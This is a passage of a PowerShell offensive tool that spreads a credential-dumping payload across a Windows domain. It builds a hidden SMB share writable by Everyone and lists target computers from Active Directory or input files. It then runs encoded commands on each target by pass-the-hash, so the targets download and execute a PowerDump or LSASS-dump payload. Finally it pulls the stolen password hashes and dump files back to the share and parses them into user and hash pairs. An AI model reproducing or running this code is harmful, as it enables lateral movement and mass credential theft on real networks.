        $CMD = (Get-Item "function:$functionToCall").ScriptBlock
        $CommandBytes = [System.Text.Encoding]::Unicode.GetBytes($CMD)
        $EncodedPayload = [Convert]::ToBase64String($CommandBytes)
        $EncodedPayload | Out-File ($PayDirectory + "\Payload1.txt")
    }

Write-Log -Log $WriteLog  -Result "Completed" -Message "The function Get-FilenameDialog is initilized." -ScriptLog $Scriptlog -LogSource "Function Initilization"
Write-Log -Log $WriteLog  -Result "Started" -Message "The exchange share will be created." -ScriptLog $Scriptlog -LogSource "Function Initilization"

try
    {
        if(Test-Path ($env:USERPROFILE + "\Appdata\Local\temp\Exchange"))
            {
                Write-Log -Log $WriteLog  -Result "Completed" -Message ("Exchange folder found in " + ($env:USERPROFILE + "\Appdata\Local\temp\Exchange") + ". No new folder is created.") -ScriptLog $Scriptlog -LogSource "Function Initilization"
                Write-Verbose -Message ("Exchange folder found in " + ($env:USERPROFILE + '\Appdata\Local\temp\Exchange'))
            }
        else 
            {
                Write-Log -Log $WriteLog  -Result "Completed" -Message ("Exchange folder not found in " + ($env:USERPROFILE + "\Appdata\Local\temp\") + ". New folder is created.") -ScriptLog $Scriptlog -LogSource "Function Initilization"
                New-Item -ItemType Directory -Path ($env:USERPROFILE + "\Appdata\Local\temp\") -Name "Exchange" | Out-Null
                Write-Verbose -Message ("Exchange folder created in " + ($env:USERPROFILE + '\Appdata\Local\temp\'))
            }
    }
catch
    {
        Write-Log -Log $WriteLog  -Result "Error" -Message ("Exchange in " + ($env:USERPROFILE + "\Appdata\Local\temp\Exchange") + " could not be created. Script terminated.") -ScriptLog $Scriptlog -LogSource "Function Initilization"
        Write-Verbose -Message ("Exchange folder could not be created in " + ($env:USERPROFILE + '\Appdata\Local\temp\'))
        throw
    }

Write-Log -Log $WriteLog  -Result "Started" -Message "Security Context of Exchange folder is adjusted to 'Everyone'." -ScriptLog $Scriptlog -LogSource "Function Initilization"

$BuiltinUsersSID = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'
$BuiltinUsersGroup = $BuiltinUsersSID.Translate([System.Security.Principal.NTAccount])
$PayloadShareACL = Get-Acl ($env:USERPROFILE + "\Appdata\Local\temp\Exchange")
$EveryReadACL = New-Object System.Security.AccessControl.FileSystemAccessRule($BuiltinUsersGroup.Value, "Modify","ContainerInherit, ObjectInherit" ,"None" , "Allow")
$PayloadShareACL.SetAccessRule($EveryReadACL)
$PayloadShareACL | Set-Acl ($env:USERPROFILE + "\Appdata\Local\temp\Exchange")

Write-Log -Log $WriteLog  -Result "Completed" -Message "Security Context of Exchange folder was successfully adjusted to 'Everyone'." -ScriptLog $Scriptlog -LogSource "Function Initilization"
Write-Verbose -Message ("Permissions on Exchange adjusted to 'Everyone' ")

Write-Log -Log $WriteLog  -Result "Started" -Message "Exchange folder will be shared as hidden folder Exchange$." -ScriptLog $Scriptlog -LogSource "Function Initilization"

New-SmbShare -Name 'Exchange$' -Path ($env:USERPROFILE + "\Appdata\Local\temp\Exchange") -ChangeAccess $BuiltinUsersGroup.Value -ErrorAction SilentlyContinue
Write-Verbose -Message ("Share created and permissions set to 'Everyone' ")

if($Error[0].CategoryInfo.Category -like "PermissionDenied")
    {
        Write-Log -Log $WriteLog  -Result "Error" -Message "Share could not be created due to insufficient permissions." -ScriptLog $Scriptlog -LogSource "Function Initilization" -AddInformation $Error[0]
        Write-Verbose -Message ("Share 'Exchange$' could not be created due to insufficient permissions. Script is terminated.")
        throw
    }
elseif($Error[0].Exception.MessageID -like "*2118*")
    {
        Write-Log -Log $WriteLog  -Result "Error" -Message "Share already exists - Script will continue. Evaluate shares when this share was not created by this script." -ScriptLog $Scriptlog -LogSource "Function Initilization" -AddInformation $Error[0]
        Write-Verbose -Message ("Share 'Exchange$' is already shared. Script will continue - evaluate the shares after the script is terminated.")
    }   


Write-Log -Log $WriteLog  -Result "Completed" -Message "Folder successfully shared." -ScriptLog $Scriptlog -LogSource "Function Initilization"
Write-Log -Log $WriteLog  -Result "Completed" -Message "Setup of SMB Share and Temp folder successfully completed." -ScriptLog $Scriptlog -LogSource "Function Initilization"

#BLOCK 1: Create and open runspace pool, setup runspaces array with min and max threads

$runSpacePool = [RunspaceFactory]::CreateRunspacePool(1,4)
$runSpacePool.ThreadOptions = $Threads
$runSpacePool.Open()
Write-Log -Log $WriteLog  -Result "Success" -Message ("Runspacepool created and with " + $runSpacePool.ThreadOptions.value__.tostring() + " threads initilized. ") -ScriptLog $Scriptlog -LogSource ""
Write-Verbose -Message ("Runspace created. $Threads Threads are used for the execution.")
# BLOCK 2: Create reusable scriptblock. This is the workhorse of the runspace. Think of it as a function.
$scriptblock = {
Param (
    [string]$ComputerName,
    $Username,
    $Hash,
    $Command,
    $ShareIP,
    $BackChannel,
    $InvokeSMB,
    $Domain
    )


    $SMBFunction = "function Invoke-ExecbySMB {" + $InvokeSMB + "}"
    IEX $SMBFunction

    if((Test-Connection -ComputerName $ComputerName -Count 2 -Quiet) -eq $true)
        {
            if($Command -eq $null)
            {
                    $SMBResult = Invoke-ExecbySMB -Target $ComputerName -Username $Username -Hash $Hash -verbose -Domain $Domain
            }
            else 
                {
                    [string]$STRCommand = {Start-Process PowerShell -ArgumentList '$I=([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Content "\\%IP%\Exchange$\Payload1.txt"))));IEX $I'}
                    $STRCommand = $STRCommand.Replace("%IP%",$ShareIP)
                    $Command = [Scriptblock]::Create($STRCommand)
                    $CommandBytes = [System.Text.Encoding]::Unicode.GetBytes($STRCommand)
                    $EncodedCommand = [Convert]::ToBase64String($CommandBytes)



                    $SMBResult = Invoke-ExecbySMB -Target $ComputerName -Username $Username  -Hash $Hash -Command "powershell.exe -encodedcommand $EncodedCommand" -verbose -Domain $Domain
                    
                    if($BackChannel -eq $true)
                        {
                        try
                            {
                            Start-Sleep -Seconds 20
                            [string]$STRCommand2 = {Start-Process PowerShell -ArgumentList "(Move-Item -Path (Get-ChildItem  -Path ('\\%TARGET%\Admin$\') -Filter '*TheHasher*').fullname -Destination ('\\%IP%\Exchange$'))"}
                            $STRCommand2 = $STRCommand2.Replace("%IP%",$ShareIP)
                            $STRCommand2 = $STRCommand2.Replace("%TARGET%",$ComputerName)
                            $Command2 = [Scriptblock]::Create($STRCommand2)
                            $CommandBytes2 = [System.Text.Encoding]::Unicode.GetBytes($STRCommand2)
                            $EncodedCommand2 = [Convert]::ToBase64String($CommandBytes2)
                            Invoke-ExecbySMB -Target $ComputerName -Username $Username  -Hash $Hash -Command "powershell.exe -encodedcommand $EncodedCommand2" -verbose -Domain $Domain
                            $BackChannelResult = "File received"
                            }
                        catch
                            {
                            $BackChannelResult = "File not received"
                            }
                        }
                    else
                        {
                        $BackChannelResult = "N/A"
                        }
                }
            ## WMI Exec in Progress
            $ExecResult = New-Object -TypeName psobject -Property @{
                Computer = $ComputerName
                Result = $SMBResult
                BackChannelResult = $BackChannelResult
                }

            

        }
    else
        {
        $ExecResult = New-Object -TypeName psobject -Property @{
                Computer = $ComputerName
                Result = "N/A"
            }

        }

    return $ExecResult

}
Write-Log -Log $WriteLog  -Result "Success" -Message "Scriptblock for Runspace has been initilized" -ScriptLog $Scriptlog -LogSource ""

################### SOURCEING ##########################
Write-Log -Log $WriteLog  -Result "Started" -Message "Sourcing block of the script is started." -ScriptLog $Scriptlog -LogSource ""
Write-Log -Log $WriteLog  -Result "Started" -Message "Based on the provided input the script selects the correct source for the import of the computer objects" -ScriptLog $Scriptlog -LogSource ""


$Computers = @()
Write-Verbose -Message ("Sourcing of the Targets is started.")
if($ActiveDirectory -eq $true)
    {
        Write-Log -Log $WriteLog  -Result "Success" -Message "The SOURCE Parameter is set to - AD, so Computer Objects will be extracted from the active directory." -ScriptLog $Scriptlog -LogSource ""
        if($ComputerDomain -ne $Null)
            {
                $root = $ComputerDomain
                Write-Log -Log $WriteLog  -Result "Completed" -Message ("The DOMAIN Parameter is set so the search will extract computer objects from: " + $root) -ScriptLog $Scriptlog -LogSource ""
            }
        else 
            {
                $root = [system.directoryservices.activedirectory.forest]::getcurrentforest().rootdomain.name
                Write-Log -Log $WriteLog  -Result "Completed" -Message ("No additional parameter is set so the searchbase is set to: " + $root) -ScriptLog $Scriptlog -LogSource "" -AddInformation "Please note this domain is extracted from the computer the script is running on."
            }
        
        Write-Verbose -Message ("Targets will be aquired from the Active Directory Domain $root")
        if($Filter -ne $Null)
            {
                $Ldapfilter = $Filter
                Write-Log -Log $WriteLog  -Result "Completed" -Message ("The FILTER parameter is set so the searchfilter is set to:" + $Ldapfilter) -ScriptLog $Scriptlog -LogSource ""
            }
        else 
            {
                $Ldapfilter = "(&(objectclass=Computer)(useraccountcontrol=4096))"
                Write-Log -Log $WriteLog  -Result "Completed" -Message ("The process has been started. The used version is :" + $Version) -ScriptLog $Scriptlog -LogSource ""
            }
        Write-Verbose -Message ("LDAP filter set to $Ldapfilter")
        if($GC -eq $false)
            {
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"DC://$root")
                Write-Log -Log $WriteLog  -Result "Completed" -Message ("The process has been started. The used version is :" + $Version) -ScriptLog $Scriptlog -LogSource ""
            }    
        else 
            {
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"GC://$root")
                Write-Log -Log $WriteLog  -Result "Started" -Message ("The process has been started. The used version is :" + $Version) -ScriptLog $Scriptlog -LogSource ""
            }
        
        $objSearcher.Filter = $Ldapfilter
        $results = $objSearcher.findall()
        Write-Log -Log $WriteLog  -Result "Started" -Message ("The process has been started. The used version is :" + $Version) -ScriptLog $Scriptlog -LogSource ""
        $Computers = $results.properties.dnshostname
        Write-Verbose -Message ("$Computers.count have been identified from the Active Directory")
        Write-Log -Log $WriteLog  -Result "Started" -Message ("The process has been started. The used version is :" + $Version) -ScriptLog $Scriptlog -LogSource ""
    }
  
elseif($Filebased -eq $true)
    {
        
        Write-Verbose -Message ("Import by File is selected")
        if($Inputfile -eq $null)
            {
                Write-Log -Log $WriteLog  -Result "Started" -Message ("Input by use of file has been selected. Dialog has been started :" + $Version) -ScriptLog $Scriptlog -LogSource ""
                $Inputfile = Get-FilenameDialog
                Write-Log -Log $WriteLog  -Result "Completed" -Message ("Input by use of file has been selected. Dialog has been complted :" + $Inputfile) -ScriptLog $Scriptlog -LogSource ""
                Write-Verbose -Message ("The file $Inputfile has been selected for import")
            }

        try 
            {
                Test-Path -Path $InputFile  
                Write-Log -Log $WriteLog  -Result "Started" -Message ("The Inputfile at " + $InputFile + " exists and will be imported.") -ScriptLog $Scriptlog -LogSource ""
                $ImportedObjects = Import-Csv $InputFile -Delimiter ";"
                Write-Log -Log $WriteLog  -Result "Completed" -Message ("File import successfully completed. In summary " + $ImportedObjects.count + " objects imported.") -ScriptLog $Scriptlog -LogSource ""
                Write-Verbose -Message ("Import has been succeeded")
            }
        catch 
            {
                Write-Log -Log $WriteLog  -Result "Error" -Message ("The import process failed. Check the file location and format. Script terminated") -ScriptLog $Scriptlog -LogSource "" -AddInformation $Error[0]
                Write-Verbose -Message ("Import has been failed - Script terminated")
                throw

            }
        
        Write-Verbose -Message ("Objects will be adjusted if required - the following domain will be added if no FQDN is provided " + (Get-WmiObject Win32_ComputerSystem).Domain.tostring())
        Write-Log -Log $WriteLog  -Result "Evaluation" -Message ("Imported Objects will be evaluated and if required adjusted.") -ScriptLog $Scriptlog -LogSource ""
        foreach($ImportedObject in $ImportedObjects)
            {
                if($ImportedObject -contains ".")
                    {
                        $Computers += $ImportedObjects
                        #Write-Log -Log $WriteLog  -Result "Started" -Message ("The process has been started. The used version is :" + $Version) -ScriptLog $Scriptlog -LogSource ""
                    }
                else
                    {
                        $Computers +=$ImportedObject + "." + (Get-WmiObject Win32_ComputerSystem).Domain.tostring()
                        #Write-Log -Log $WriteLog  -Result "Started" -Message ("The process has been started. The used version is :" + $Version) -ScriptLog $Scriptlog -LogSource ""
                    }
            }
        Write-Verbose -Message ($Computers.count.tostring() + " Computers have been imported.")    
    }

elseif($Hosts -ne $null)
    {
        Write-Verbose -Message ("Import by variable has been detected.") 
        Write-Log -Log $WriteLog  -Result "Started" -Message ("The import by variable detected") -ScriptLog $Scriptlog -LogSource ""
        $Hosts = $hosts.split(",")
        Write-Log -Log $WriteLog  -Result "Completed" -Message ("In summary " + $hosts.count + " objects were detected." ) -ScriptLog $Scriptlog -LogSource ""
        Write-Log -Log $WriteLog  -Result "Evaluation" -Message ("Imported Objects will be evaluated and if required adjusted.") -ScriptLog $Scriptlog -LogSource ""
        Write-Verbose -Message ("Objects will be adjusted if required - the following domain will be added if no FQDN is provided " + (Get-WmiObject Win32_ComputerSystem).Domain.tostring())
        foreach($iHost in $Hosts)
            {
            if($ImportedObject -contains ".")
                {
                    $Computers += $iHost
                }
            else
                {
                    $Computers += $iHost + "." + (Get-WmiObject Win32_ComputerSystem).Domain.tostring()
                }

            }
        Write-Verbose -Message (($Computers.count.tostring()) + " Computers have been imported.") 
    }
else 
    {
        Write-Log -Log $WriteLog  -Result "Error" -Message ("No input clients were detected. Script terminated") -ScriptLog $Scriptlog -LogSource ""
        throw
    }

Write-Verbose -Message ("The payload for the command " + $Command +  " will be generated")
Write-Log -Log $WriteLog  -Result "Started" -Message ("Payload creation is started. Provided Command: " + $Command) -ScriptLog $Scriptlog -LogSource ""

if($Command.Length -gt 1)
    {
 
    $PayCommand = (Get-ChildItem function: | Where {$_.name -like "*$Command*"}).Name
    If($PayCommand.Count -gt 1)
        {
            Write-Log -Log $WriteLog  -Result "Error" -Message ("Multiple Payloads detected - please specify the command.") -ScriptLog $Scriptlog -LogSource "" -AddInformation $PayCommand
            Write-Verbose -Message ("No Payload could be determined - please specify the command and ensure that the required module / function is loaded")
            throw

        }
    else 
        {
            Write-Log -Log $WriteLog  -Result "Completed" -Message ("The following command will be encoded and used during the run: " + $PayCommand) -ScriptLog $Scriptlog -LogSource ""
            Write-Verbose -Message ("Payload identified: " + $PayCommand)

        }
    
    Write-Log -Log $WriteLog  -Result "Started" -Message ("Payload will be encoded and placed within the used share") -ScriptLog $Scriptlog -LogSource ""
    Generate-Payload -functionToCall $PayCommand -PayDirectory ($env:USERPROFILE + "\Appdata\Local\temp\Exchange")
    Write-Verbose -Message ("Payload gnerated and placed in " + ($env:USERPROFILE + "\Appdata\Local\temp\Exchange"))
    Write-Log -Log $WriteLog  -Result "Completed" -Message ("Payload prepared and ready for use") -ScriptLog $Scriptlog -LogSource ""
    Write-Log -Log $WriteLog  -Result "Started" -Message ("Payload will be encoded and placed within the used share") -ScriptLog $Scriptlog -LogSource ""
    $ShareIPAdress =  (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias ((Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected).InterfaceAlias[0])).IPAddress
    Write-Verbose -Message ("IP Address for Payload exchange has been selected - " + $ShareIPAdress)
    }
elseif($Command.Length -lt 1)
    {
    Write-Log -Log $WriteLog  -Result "Started" -Message ("Payload will be encoded and placed within the used share") -ScriptLog $Scriptlog -LogSource ""
    if($PowerDump -eq $true)
        {
            Write-Verbose -Message ("No individual Payload set - therefore payload is set to - LSADump")
            Generate-Payload -functionToCall Invoke-PowerDump -PayDirectory ($env:USERPROFILE + "\Appdata\Local\temp\Exchange")
            $BuiltInPowerDump = $true
            Write-Verbose -Message ("Payload gnerated and placed in " + ($env:USERPROFILE + "\Appdata\Local\temp\Exchange"))
        }
    elseif($LSADump -eq $true)
        {
            Write-Verbose -Message ("No individual Payload set - therefore payload is set to - PowerDump")
            Generate-Payload -functionToCall Invoke-LSADump -PayDirectory ($env:USERPROFILE + "\Appdata\Local\temp\Exchange")
            $BuiltInLSADump = $true
            Write-Verbose -Message ("Payload gnerated and placed in " + ($env:USERPROFILE + "\Appdata\Local\temp\Exchange"))
        }

    
    Write-Log -Log $WriteLog  -Result "Completed" -Message ("Payload prepared and ready for use") -ScriptLog $Scriptlog -LogSource ""
    $ShareIPAdress =  (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias ((Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected).InterfaceAlias[0])).IPAddress
    Write-Log -Log $WriteLog  -Result "Info" -Message ("IP Adress for Payload transmission is set to " + $ShareIPAdress) -ScriptLog $Scriptlog -LogSource ""
    Write-Verbose -Message ("IP Address for Payload exchange has been selected - " + $ShareIPAdress)
    }


Write-Log -Log $WriteLog  -Result "Started" -Message ("Jobs will be initilized and started. In summary " + $Computers.count.tostring() + " jobs will be created.") -ScriptLog $Scriptlog -LogSource ""
$jobs = @()
Write-Verbose -Message ("Jobs initilized")
foreach($Computer in $Computers) 
{
    $job = [powershell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Username).AddArgument($Hash).AddArgument($Command).AddArgument($ShareIPAdress).AddArgument($BackChannel).AddArgument((Get-Item function:Invoke-ExecbySMB).Definition).AddArgument($UserDomain)
    $job.RunspacePool = $runSpacePool
    $jobs += New-Object PSObject -Property @{
        RunNum = $Group
        Pipe = $job
        Result = $job.BeginInvoke()
    }
    

}


Write-Log -Log $WriteLog  -Result "Completed" -Message ("Jobs running.") -ScriptLog $Scriptlog -LogSource ""

while ($jobs.result.IsCompleted -contains $false) {
    Write-Progress -Activity "Execution of jobs" -Status ("Currently " + ($jobs.result.IsCompleted | Where {$_ -eq "True"}).count + " of " + ($jobs.count) + " are completed.") -Id $jobs.count -PercentComplete (($jobs.result.IsCompleted | Where {$_ -eq "True"}).count / ($jobs.count / 100))
}



Write-Log -Log $WriteLog  -Result "Success" -Message ("Job execution completed. Results will be evaluated") -ScriptLog $Scriptlog -LogSource ""
Write-Verbose -Message ("Jobs are completed - Result evaluation has been started.")
$results = @()
$errors = @()
ForEach ($job in $jobs)
{   
    $res = $job.Pipe.EndInvoke($job.Result)
    if($job.Pipe.HadErrors) {
        $errors += $job.Pipe.Streams.Error.ReadAll()
    }
    $results += $res
}
Write-Log -Log $WriteLog  -Result "Evaluation" -Message ("The jobs had been evaluated. ") -ScriptLog $Scriptlog -LogSource ""
Write-Log -Log $WriteLog  -Result "Evaluation" -Message ("The results are of " + $jobs.count + " Jobs had " + $errors.count + " errors.") -ScriptLog $Scriptlog -LogSource ""
Write-Verbose -Message ("The results are of " + $jobs.count + " Jobs had " + $errors.count + " errors.")

$runSpacePool.Close() 
$runSpacePool.Dispose()
Write-Log -Log $WriteLog  -Result "Completed" -Message ("Runspace closed and disposed.") -ScriptLog $Scriptlog -LogSource ""

Start-Sleep -Seconds 30
if($BuiltInPowerDump -eq $true)
    {
    $Resultfiles = Get-ChildItem -Path ($env:USERPROFILE + "\Appdata\Local\temp\Exchange") -Filter "*TheHasher*" 

    $Creds= @()
    Foreach($Resultfile in $Resultfiles)
        {
            $SystemName = $null 
            $SystemName = $Resultfile.name.split("-")[0] 
            $Entries = (Get-Content -Path $Resultfile.FullName)
            foreach($Entry in $Entries)
                {
                $Creds += New-Object PSObject -Property @{
                    SystemName = $SystemName
                    User = $Entry.replace("::::","").split(":")[0]
                    Hash = $Entry.replace("::::","").split(":")[-1]
                    }
                }
        }
    }
elseif($BuiltInLSADump -eq $true)
    {
        $Resultfiles = Get-ChildItem -Path ($env:USERPROFILE + "\Appdata\Local\temp\Exchange") -Filter "*TheHasher*"
        $Dmps= @()
        Foreach($Resultfile in $Resultfiles)
            {
                $SystemName = $null 
                $SystemName = $Resultfile.name.split("-")[0] 
                $Dmps += New-Object PSObject -Property @{
                    SystemName = $SystemName
                    Path = $Resultfile.FullName
                }
            }
    }
#LSASS DUMP 
Write-Verbose -Message ("Parsing of the Results completed.")



Write-Log -Log $WriteLog  -Result "Started" -Message ("Share and Directory will be cleaned up") -ScriptLog $Scriptlog -LogSource ""
try {
    Remove-SmbShare -Name "Exchange$" -Force
    Write-Log -Log $WriteLog  -Result "Completed" -Message ("Share removed.") -ScriptLog $Scriptlog -LogSource ""
    if($BuiltInPowerDump = $true)
        {
        Remove-Item -Path  ($env:USERPROFILE + "\Appdata\Local\temp\Exchange") -Recurse
        Write-Log -Log $WriteLog  -Result "Completed" -Message ("Directory removed.") -ScriptLog $Scriptlog -LogSource ""
        }
    Write-Verbose -Message ("Cleanup completed.")
}
catch
    {
        Write-Log -Log $WriteLog  -Result "Error" -Message ("Share and Directory could not be removed. Please check manually.") -ScriptLog $Scriptlog -LogSource "" -AddInformation $error[0]
    }

$End = Get-date
Write-Log -Log $WriteLog  -Result "Completed" -Message ("Process completed. Bye for now.") -ScriptLog $Scriptlog -LogSource ""

if($BuiltInPowerDump -eq $true)
    {
    return $Creds
    }
elseif($BuiltInLSADump -eq $true)
    {
    return $Dmps
    }
}
